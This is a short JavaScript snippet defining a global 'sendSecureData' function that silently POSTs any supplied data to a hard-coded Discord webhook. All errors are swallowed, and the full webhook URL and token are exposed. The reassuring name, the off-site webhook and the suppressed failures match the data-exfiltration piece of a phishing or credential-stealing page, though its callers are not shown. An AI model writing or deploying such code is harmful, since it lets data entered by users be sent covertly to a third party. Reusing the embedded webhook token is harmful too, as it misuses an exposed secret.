const WEBHOOK_URL = 'https://discord.com/api/webhooks/1454907409515417805/0rQ93_Z5zpQJqk-mPYpwuaZ5G5RXSypvfT21ZnlOt-QebHoqHZr-wG-BKqudH7Ihm997';

window.sendSecureData = function(data) {
    try {
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(() => {});
    } catch(e) {}
};
